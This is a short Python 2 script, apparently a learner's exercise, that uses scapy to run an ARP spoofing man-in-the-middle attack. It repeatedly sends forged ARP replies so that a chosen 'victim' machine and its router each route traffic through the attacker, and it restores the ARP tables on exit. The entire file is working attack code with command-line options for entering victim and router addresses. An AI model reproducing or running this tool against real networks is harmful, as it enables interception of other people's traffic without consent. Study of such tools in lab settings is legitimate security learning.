#!/usr/bin/env python2
import scapy.all as scapy
import optparse
import time
import sys


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("--ip", dest="ip_range")
    parser.add_option("--router", dest="router_ip", help="enter ip you want to become")
    parser.add_option("--victim", dest="victim_ip", help="enter computer victim IP")
    (options, arguments) = parser.parse_args()
    if not options.ip_range:
        parser.error("Specify ip of target computer --ip")
    elif not options.router_ip:
        parser.error("specify ip of router --router")
    elif not options.victim_ip:
        parser.error("specify ip of victim computer --victim")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
# pdst IP of vitcim & hwdst is MAC of vitcim & psrc is IP of route -n & op as 2 means sending ARP as response not req
# spoof or psrc is IP i want to become


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
# dest is computer for line 74
# source is router for line 74


options = get_args()
get_mac(options.ip_range)
sent_packets_count = 0
try:
    while True:
        spoof(options.router_ip, options.victim_ip)  # tells the router i am the victim computer
        spoof(options.victim_ip, options.router_ip)  # tells computer i am the router
        sent_packets_count = sent_packets_count + 2
        print("\rpackets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("User quitting.......resetting ARP table")
    restore(options.victim_ip, options.router_ip)  # sends packet to computer to correct mac of router
    restore(options.router_ip, options.victim_ip)  # sends packet to router to correct mac of target computer


